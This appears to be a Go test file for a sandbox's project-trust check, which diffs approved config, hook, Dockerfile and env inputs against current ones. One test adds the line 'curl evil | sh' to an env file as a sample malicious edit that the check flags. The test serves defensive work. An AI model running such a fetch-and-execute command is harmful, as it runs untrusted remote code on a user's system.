package projecttrust

import (
	"fmt"
	"reflect"
	"slices"
	"testing"

	"github.com/inoio/agents-sandbox/internal/sandbox/state"
)

func projectionOf(inputs ...Input) Projection { return Projection{Inputs: inputs} }

func approvalOf(projection Projection) state.ApprovedProjectLayer {
	return toApproval(projection)
}

func TestEvaluateApprovesAnEmptyLayerWithoutARecord(t *testing.T) {
	if got := Evaluate(Projection{}, state.ApprovedProjectLayer{}); !got.Approved || len(got.Changes) != 0 {
		t.Errorf("Evaluate(empty) = %+v, want approved", got)
	}
}

func TestEvaluateApprovesTheRecordedProjection(t *testing.T) {
	current := projectionOf(Input{Path: "/p/config.yaml", Kind: KindLauncherConfig, Entries: []string{`memory: "8G"`}})
	if got := Evaluate(current, approvalOf(current)); !got.Approved {
		t.Errorf("Evaluate(recorded) = %+v, want approved", got)
	}
}

// TestEvaluateListsEveryChangedInput pins that a differing projection names
// each added, removed, and modified input with the entries that differ, and
// that a missing record treats every input as added.
func TestEvaluateListsEveryChangedInput(t *testing.T) {
	config := Input{
		Path:    "/p/config.yaml",
		Kind:    KindLauncherConfig,
		Entries: []string{`memory: "8G"`, `network.profile: "none"`},
	}
	hook := Input{Path: "/p/hook.sh", Kind: KindFile, Entries: []string{"echo hi"}}
	dockerfile := Input{Path: "/p/Dockerfile", Kind: KindFile, Entries: []string{"FROM base"}}
	approved := approvalOf(projectionOf(config, hook))

	changedConfig := config
	changedConfig.Entries = []string{`memory: "8G"`, `network.profile: "public"`}
	got := Evaluate(projectionOf(changedConfig, dockerfile), approved)

	want := []Change{
		{Path: "/p/Dockerfile", Kind: KindFile, Status: StatusAdded, Lines: []string{"+ FROM base"}},
		{
			Path: "/p/config.yaml", Kind: KindLauncherConfig, Status: StatusModified,
			Lines: []string{`- network.profile: "none"`, `+ network.profile: "public"`},
		},
		{Path: "/p/hook.sh", Kind: KindFile, Status: StatusRemoved, Lines: []string{"- echo hi"}},
	}
	if got.Approved || !reflect.DeepEqual(got.Changes, want) {
		t.Errorf("Evaluate = %+v, want changes %+v", got, want)
	}

	first := Evaluate(projectionOf(config), state.ApprovedProjectLayer{})
	if first.Approved || len(first.Changes) != 1 || first.Changes[0].Status != StatusAdded {
		t.Errorf("Evaluate(no record) = %+v, want the input as added", first)
	}
}

// TestEvaluateTellsTheUsesOfOnePathApart pins that a path read two ways (an env
// file that is also a home: source) is two inputs: a change to its raw content
// shows even when its parsed form is unchanged.
func TestEvaluateTellsTheUsesOfOnePathApart(t *testing.T) {
	parsed := Input{Path: "/p/env", Kind: KindEnv, Entries: []string{"A=1"}}
	raw := Input{Path: "/p/env", Kind: KindFile, Entries: []string{"A=1"}}
	approved := approvalOf(projectionOf(parsed, raw))

	edited := raw
	edited.Entries = []string{"A=1", "curl evil | sh"}
	got := Evaluate(projectionOf(edited, parsed), approved)
	want := []Change{{Path: "/p/env", Kind: KindFile, Status: StatusModified, Lines: []string{"+ curl evil | sh"}}}
	if !reflect.DeepEqual(got.Changes, want) {
		t.Errorf("Evaluate = %+v, want only the raw content change %+v", got.Changes, want)
	}
}

// TestLineDiffKeepsOrderAndRepeats pins the order-aware diff: a removed repeat
// and a moved line show as changes, unchanged lines do not.
func TestLineDiffKeepsOrderAndRepeats(t *testing.T) {
	for _, tc := range []struct {
		name          string
		before, after []string
		want          []string
	}{
		{"removed repeat", []string{"RUN a", "RUN a", "RUN b"}, []string{"RUN a", "RUN b"}, []string{"- RUN a"}},
		{"moved line", []string{"A", "B", "C"}, []string{"B", "C", "A"}, []string{"- A", "+ A"}},
		{"replaced middle", []string{"A", "B", "C"}, []string{"A", "X", "C"}, []string{"- B", "+ X"}},
		{"appended", []string{"A"}, []string{"A", "B"}, []string{"+ B"}},
		{"emptied", []string{"A", "B"}, nil, []string{"- A", "- B"}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			if got := lineDiff(tc.before, tc.after); !slices.Equal(got, tc.want) {
				t.Errorf("lineDiff(%q, %q) = %q, want %q", tc.before, tc.after, got, tc.want)
			}
		})
	}
}

// TestLineDiffShowsLongInputsWhole pins the bound on the diff table: inputs
// too long to diff are shown as their whole old and new content.
func TestLineDiffShowsLongInputsWhole(t *testing.T) {
	var before, after []string
	for i := range 1001 {
		before = append(before, fmt.Sprint("line ", i))
		after = append(after, fmt.Sprint("line ", i))
	}
	after[500] = "changed"
	got := lineDiff(before, after[:1000])
	if len(got) != 2001 || got[0] != "- line 0" || got[1001] != "+ line 0" {
		t.Errorf(
			"lineDiff over the bound = %d lines starting %q, want the whole old then new content",
			len(got),
			got[:2],
		)
	}
	if got := lineDiff(before[:1000], after[:1000]); !slices.Equal(got, []string{"- line 500", "+ changed"}) {
		t.Errorf("lineDiff at the bound = %q, want the line diff", got)
	}
}
